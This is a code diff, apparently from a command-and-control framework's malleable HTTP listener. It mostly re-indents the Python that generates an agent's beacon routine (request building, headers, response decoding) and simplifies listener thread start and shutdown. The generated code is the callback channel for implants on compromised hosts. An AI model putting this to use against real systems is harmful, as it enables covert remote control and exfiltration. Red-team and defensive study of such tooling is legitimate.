-                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+                sendMessage += "            if parameters:\n"
+                sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
 
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.URIAPPEND
                 ):
-                    sendMessage += "        requestUri += routingPacket;\n"
+                    sendMessage += "                requestUri += routingPacket;\n"
 
                 # ==== ADD BODY ====
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        body = routingPacket\n"
+                    sendMessage += "                body = routingPacket\n"
                 else:
-                    sendMessage += "        body = '" + profile.get.client.body + "'\n"
-                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
+                    sendMessage += (
+                        "            body = '" + profile.get.client.body + "'\n"
+                    )
+                sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
 
                 # ==== BUILD REQUEST ====
-                sendMessage += "        req = vreq(requestUri, body)\n"
-                sendMessage += "        req.verb = '" + profile.get.client.verb + "'\n"
+                sendMessage += "            req = vreq(requestUri, body)\n"
+                sendMessage += (
+                    "            req.verb = '" + profile.get.client.verb + "'\n"
+                )
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.get.client.headers.items():
                     sendMessage += (
-                        "        req.add_header('" + header + "', '" + value + "')\n"
+                        "            req.add_header('"
+                        + header
+                        + "', '"
+                        + value
+                        + "')\n"
                     )
                 if (
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.HEADER
                 ):
                     sendMessage += (
-                        "        req.add_header('"
+                        "            req.add_header('"
                         + profile.get.client.metadata.terminator.arg
                         + "', routingPacket)\n"
                     )
 
                 # ==== SEND REQUEST ====
-                sendMessage += "    try:\n"
-                sendMessage += "        res = urllib.request.urlopen(req);\n"
+                sendMessage += "        try:\n"
+                sendMessage += "            res = urllib.request.urlopen(req);\n"
 
                 # ==== EXTRACT RESPONSE ====
                 if (
@@ -1276,18 +1307,18 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 ):
                     header = profile.get.server.output.terminator.arg
                     sendMessage += (
-                        "        data = res.info().dict['"
+                        "            data = res.info().dict['"
                         + header
                         + "'] if '"
                         + header
                         + "' in res.info().dict else ''\n"
                     )
-                    sendMessage += "        data = urllib.parse.unquote(data)\n"
+                    sendMessage += "            data = urllib.parse.unquote(data)\n"
                 elif (
                     profile.get.server.output.terminator.type
                     == malleable.Terminator.PRINT
                 ):
-                    sendMessage += "        data = res.read()\n"
+                    sendMessage += "            data = res.read()\n"
 
                 # ==== DECODE RESPONSE ====
                 sendMessage += (
@@ -1302,24 +1333,22 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     + "\n"
                 )
                 # before return we encode to bytes, since in some transformations "join" produces str
-                sendMessage += (
-                    "        if isinstance(data,str): data = data.encode('latin-1');\n"
-                )
-                sendMessage += "        return ('200', data)\n"
+                sendMessage += "            if isinstance(data,str): data = data.encode('latin-1');\n"
+                sendMessage += "            return ('200', data)\n"
 
                 # ==== HANDLE ERROR ====
-                sendMessage += "    except urllib.request.HTTPError as HTTPError:\n"
-                sendMessage += "        missedCheckins += 1\n"
-                sendMessage += "        if HTTPError.code == 401:\n"
-                sendMessage += "            sys.exit(0)\n"
-                sendMessage += "        return (HTTPError.code, '')\n"
-                sendMessage += "    except urllib.request.URLError as URLError:\n"
-                sendMessage += "        missedCheckins += 1\n"
-                sendMessage += "        return (URLError.reason, '')\n"
+                sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
+                sendMessage += "            self.missedCheckins += 1\n"
+                sendMessage += "            if HTTPError.code == 401:\n"
+                sendMessage += "                sys.exit(0)\n"
+                sendMessage += "            return (HTTPError.code, '')\n"
+                sendMessage += "        except urllib.request.URLError as URLError:\n"
+                sendMessage += "            self.missedCheckins += 1\n"
+                sendMessage += "            return (URLError.reason, '')\n"
 
-                sendMessage += "    return ('', '')\n"
+                sendMessage += "        return ('', '')\n"
 
-                return updateServers + sendMessage
+                return sendMessage
 
             else:
                 log.error(
@@ -1735,44 +1764,26 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
             self.instance_log.error(message, exc_info=True)
             log.error(message, exc_info=True)
 
-    def start(self, name=""):
+    def start(self):
         """
-        Start a threaded instance of self.start_server() and store it in
-        the self.threads dictionary keyed by the listener name.
+        Start a threaded instance of self.start_server() and store it in the
+        self.thread property.
         """
         self.instance_log = log_util.get_listener_logger(
             LOG_NAME_PREFIX, self.options["Name"]["Value"]
         )
-
         listenerOptions = self.options
-        if name and name != "":
-            self.threads[name] = helpers.KThread(
-                target=self.start_server, args=(listenerOptions,)
-            )
-            self.threads[name].start()
-            time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
-        else:
-            name = listenerOptions["Name"]["Value"]
-            self.threads[name] = helpers.KThread(
-                target=self.start_server, args=(listenerOptions,)
-            )
-            self.threads[name].start()
-            time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
+        self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
+        self.thread.start()
+        time.sleep(1)
+        # returns True if the listener successfully started, false otherwise
+        return self.thread.is_alive()
 
-    def shutdown(self, name=""):
+    def shutdown(self):
         """
-        Terminates the server thread stored in the self.threads dictionary,
-        keyed by the listener name.
+        Terminates the server thread stored in the self.thread property.
         """
-        if name and name != "":
-            to_kill = name
-        else:
-            to_kill = self.options["Name"]["Value"]
-
+        to_kill = self.options["Name"]["Value"]
         self.instance_log.info(f"{to_kill}: shutting down...")
         log.info(f"{to_kill}: shutting down...")
-        self.threads[to_kill].kill()
+        self.thread.kill()
